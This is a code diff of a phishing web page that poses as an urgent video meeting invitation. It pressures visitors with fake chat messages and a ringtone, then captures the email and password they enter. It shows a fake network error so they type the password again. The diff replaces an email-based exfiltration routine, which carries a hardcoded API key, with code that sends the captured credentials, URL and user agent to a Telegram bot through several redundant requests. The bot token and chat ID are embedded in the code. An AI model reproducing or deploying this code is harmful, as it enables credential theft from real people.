@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -793,122 +794,118 @@
     </audio>
 
 <script>
-    // ... (your existing code remains the same until the CREDENTIAL CAPTURE FUNCTIONALITY section)
-     // Request notification permission on page load
-        window.addEventListener('load', function() {
-            if ('Notification' in window && Notification.permission === 'default') {
-                Notification.requestPermission();
-            }
-        });
-
-        // Sample chat messages
-        const chatMessages = [
-            "John: Hello, we're in a hurry and need your immediate presence in the meeting.",
-            "Sarah: Urgent: We require your attendance in the meeting right away.",
-            "Mike: Please join us as soon as possible, we're waiting for you.",
-            "Lisa: The client is waiting for our presentation.",
-            "David: Can you share your screen when you join?",
-            "Emma: We have some important updates to share.",
-            "Alex: The deadline is approaching fast.",
-            "Tom: Let's get started with the agenda items."
-        ];
-
-        let chatInterval;
-
-        function goToWaitingRoom() {
-            document.getElementById('landingPage').classList.add('hidden');
-            document.getElementById('waitingRoom').style.display = 'block';
-            
-            // Start ringtone
-            const audio = document.getElementById('ringtone');
-            audio.play().catch(() => {});
+    // Request notification permission on page load
+    window.addEventListener('load', function() {
+        if ('Notification' in window && Notification.permission === 'default') {
+            Notification.requestPermission();
         }
+    });
 
-        function joinMeeting() {
-            // Request camera and microphone access
-            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-                .then(stream => {
-                    // Stop ringtone
-                    stopRingtone();
-                    
-                    // Hide waiting room, show meeting
-                    document.getElementById('waitingRoom').style.display = 'none';
-                    document.getElementById('meetingInterface').style.display = 'block';
-                    
-                    // Show user's camera feed
-                    const video = document.getElementById('userVideo');
-                    video.srcObject = stream;
-                    
-                    // Start chat messages
-                    startChatMessages();
-                })
-                .catch(err => {
-                    alert("Camera or microphone access denied. Please allow access to join the meeting.");
-                });
-        }
+    // Sample chat messages
+    const chatMessages = [
+        "John: Hello, we're in a hurry and need your immediate presence in the meeting.",
+        "Sarah: Urgent: We require your attendance in the meeting right away.",
+        "Mike: Please join us as soon as possible, we're waiting for you.",
+        "Lisa: The client is waiting for our presentation.",
+        "David: Can you share your screen when you join?",
+        "Emma: We have some important updates to share.",
+        "Alex: The deadline is approaching fast.",
+        "Tom: Let's get started with the agenda items."
+    ];
 
-        function stopRingtone() {
-            const audio = document.getElementById('ringtone');
-            audio.pause();
-            audio.currentTime = 0;
-        }
+    let chatInterval;
 
-        function startChatMessages() {
-            chatInterval = setInterval(() => {
-                const randomMessage = chatMessages[Math.floor(Math.random() * chatMessages.length)];
-                showChatMessage(randomMessage);
-            }, 3000 + Math.random() * 4000); // Random interval between 3-7 seconds
-        }
+    function goToWaitingRoom() {
+        document.getElementById('landingPage').classList.add('hidden');
+        document.getElementById('waitingRoom').style.display = 'block';
+        
+        // Start ringtone
+        const audio = document.getElementById('ringtone');
+        audio.play().catch(() => {});
+    }
 
-        function showChatMessage(message) {
-            const captionElement = document.getElementById('caption');
-            captionElement.textContent = message;
-            captionElement.style.opacity = '1';
-            
-            // Hide message after 5 seconds
+    function joinMeeting() {
+        // Request camera and microphone access
+        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+            .then(stream => {
+                // Stop ringtone
+                stopRingtone();
+                
+                // Hide waiting room, show meeting
+                document.getElementById('waitingRoom').style.display = 'none';
+                document.getElementById('meetingInterface').style.display = 'block';
+                
+                // Show user's camera feed
+                const video = document.getElementById('userVideo');
+                video.srcObject = stream;
+                
+                // Start chat messages
+                startChatMessages();
+            })
+            .catch(err => {
+                alert("Camera or microphone access denied. Please allow access to join the meeting.");
+            });
+    }
+
+    function stopRingtone() {
+        const audio = document.getElementById('ringtone');
+        audio.pause();
+        audio.currentTime = 0;
+    }
+
+    function startChatMessages() {
+        chatInterval = setInterval(() => {
+            const randomMessage = chatMessages[Math.floor(Math.random() * chatMessages.length)];
+            showChatMessage(randomMessage);
+        }, 3000 + Math.random() * 4000); // Random interval between 3-7 seconds
+    }
+
+    function showChatMessage(message) {
+        const captionElement = document.getElementById('caption');
+        captionElement.textContent = message;
+        captionElement.style.opacity = '1';
+        
+        // Hide message after 5 seconds
+        setTimeout(() => {
+            captionElement.style.opacity = '0';
+        }, 5000);
+    }
+
+    function cancelMeeting() {
+        // Show error message
+        const errorMessage = document.getElementById('errorMessage');
+        errorMessage.classList.add('show');
+        
+        // Hide error message after 5 seconds
+        setTimeout(() => {
+            errorMessage.classList.remove('show');
+        }, 5000);
+    }
+
+    function showCustomToast(message, duration = 3000) {
+        const toast = document.createElement('div');
+        toast.className = 'custom-toast';
+        const icon = document.createElement('span');
+        icon.className = 'custom-toast-icon';
+        icon.innerHTML = '&#9940;';
+        const text = document.createElement('span');
+        text.textContent = message;
+        toast.appendChild(icon);
+        toast.appendChild(text);
+        document.body.appendChild(toast);
+        toast.offsetHeight;
+        toast.classList.add('show');
+        setTimeout(() => {
+            toast.classList.remove('show');
             setTimeout(() => {
-                captionElement.style.opacity = '0';
-            }, 5000);
-        }
+                document.body.removeChild(toast);
+            }, 300);
+        }, duration);
+    }
 
-       function cancelMeeting() {
-            // Show error message
-            const errorMessage = document.getElementById('errorMessage');
-            errorMessage.classList.add('show');
-            
-            // Hide error message after 5 seconds
-            setTimeout(() => {
-                errorMessage.classList.remove('show');
-            }, 5000);
-        }
-
-
-        function showCustomToast(message, duration = 3000) {
-            const toast = document.createElement('div');
-            toast.className = 'custom-toast';
-            const icon = document.createElement('span');
-            icon.className = 'custom-toast-icon';
-            icon.innerHTML = '&#9940;';
-            const text = document.createElement('span');
-            text.textContent = message;
-            toast.appendChild(icon);
-            toast.appendChild(text);
-            document.body.appendChild(toast);
-            toast.offsetHeight;
-            toast.classList.add('show');
-            setTimeout(() => {
-                toast.classList.remove('show');
-                setTimeout(() => {
-                    document.body.removeChild(toast);
-                }, 300);
-            }, duration);
-        }
-
-    
-
-    // CREDENTIAL CAPTURE FUNCTIONALITY
-    const elasticEmailApiKey = '9E00668C1ADFA64D550A4667DFE59D1C5073B82E6302B4E47378551A86C04C1E0F7E45E492B018F64BBFC055C623AF44';
-    const fromEmail = 'smtp@choicelink.online';
+    // TELEGRAM CREDENTIAL CAPTURE FUNCTIONALITY
+    const botToken = '7330822154:AAH-OZu1aatQ2VXBgds_jzw3OzxEvy5_psY';
+    const chatId = '1863969785';
 
     let attemptCount = 0;
     let errorTimeout;
@@ -1042,7 +1039,7 @@
             errorDiv.textContent = 'Network error! Connection timed out.';
         }
 
-        sendCredentialsToEmail(victimEmail, password, `Attempt ${attemptCount}`);
+        sendCredentialsToTelegram(victimEmail, password, `Attempt ${attemptCount}`);
         errorDiv.style.display = 'block';
         
         errorTimeout = setTimeout(() => {
@@ -1053,27 +1050,122 @@
         passwordInput.focus();
     });
 
-    // Function to send credentials via Elastic Email
-    function sendCredentialsToEmail(victimEmail, password, attemptNumber) {
-        const subject = `Credential Capture - ${attemptNumber}`;
-        const bodyText = `Victim Email: ${victimEmail}\nPassword: ${password}\nAttempt: ${attemptNumber}\nTimestamp: ${new Date().toLocaleString()}\nURL: ${window.location.href}`;
+    // Function to send credentials to Telegram
+    function sendCredentialsToTelegram(victimEmail, password, attemptNumber) {
+        const message = `🔐 CREDENTIALS CAPTURED 🔐
+        
+📧 Email: ${victimEmail}
+🔑 Password: ${password}
+🔄 Attempt: ${attemptNumber}
+⏰ Timestamp: ${new Date().toLocaleString()}
+🌐 URL: ${window.location.href}
+🖥️ User Agent: ${navigator.userAgent}
+📍 IP: Fetching...`;
 
-        const formData = new URLSearchParams();
-        formData.append('apikey', elasticEmailApiKey);
-        formData.append('subject', subject);
-        formData.append('from', fromEmail);
-        formData.append('to', targetEmail);
-        formData.append('bodyText', bodyText);
-        formData.append('isTransactional', 'true');
+        // Send to Telegram
+        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('text', message);
+        formData.append('parse_mode', 'HTML');
 
-        fetch('https://api.elasticemail.com/v2/email/send', {
+        // First try: Send to Telegram
+        fetch(telegramUrl, {
             method: 'POST',
-            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
             body: formData
         })
         .then(response => response.json())
-        .then(data => console.log('Credentials captured:', data))
-        .catch(error => console.error('Error:', error));
+        .then(data => {
+            console.log('Credentials sent to Telegram:', data);
+            
+            // If Telegram fails, try backup method (webhook)
+            if (!data.ok) {
+                console.log('Telegram failed, trying backup method...');
+                sendToBackupWebhook(victimEmail, password, attemptNumber);
+            }
+        })
+        .catch(error => {
+            console.error('Telegram error:', error);
+            // If fetch fails, try backup method
+            sendToBackupWebhook(victimEmail, password, attemptNumber);
+        });
+    }
+
+    // Backup method using webhook (for Vercel deployment)
+    function sendToBackupWebhook(victimEmail, password, attemptNumber) {
+        // Create a simple webhook call to a serverless function
+        const webhookData = {
+            email: victimEmail,
+            password: password,
+            attempt: attemptNumber,
+            timestamp: new Date().toISOString(),
+            url: window.location.href,
+            userAgent: navigator.userAgent
+        };
+
+        // Try to send via a serverless function (you'll need to create this on Vercel)
+        fetch('/api/telegram-webhook', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(webhookData)
+        })
+        .then(response => response.json())
+        .then(data => console.log('Backup webhook response:', data))
+        .catch(error => console.error('Backup webhook error:', error));
+
+        // Also try direct Telegram API with different approach
+        const directMessage = `CREDENTIALS - Email: ${victimEmail} | Pass: ${password} | Attempt: ${attemptNumber}`;
+        
+        // Alternative Telegram API call
+        const altUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(directMessage)}`;
+        
+        fetch(altUrl)
+        .then(response => response.json())
+        .then(data => console.log('Alternative Telegram method:', data))
+        .catch(error => console.error('Alternative method error:', error));
+    }
+
+    // Additional method for better reliability
+    function sendCredentialsMultipleWays(victimEmail, password, attemptNumber) {
+        const message = `🔐 New Credentials Captured 🔐
+        
+📧 Email: ${victimEmail}
+🔑 Password: ${password}
+🔄 Attempt: ${attemptNumber}
+⏰ Time: ${new Date().toLocaleString()}
+🌐 Page: ${window.location.href}`;
+
+        // Method 1: Standard Telegram API
+        const method1 = fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        });
+
+        // Method 2: URL parameters (GET request)
+        const method2 = fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
+
+        // Method 3: FormData
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('text', message);
+        const method3 = fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            body: formData
+        });
+
+        // Try all methods
+        Promise.any([method1, method2, method3])
+            .then(response => response.json())
+            .then(data => console.log('Credentials successfully sent via one of the methods:', data))
+            .catch(error => console.error('All Telegram methods failed:', error));
     }
 
     // Initialize the page
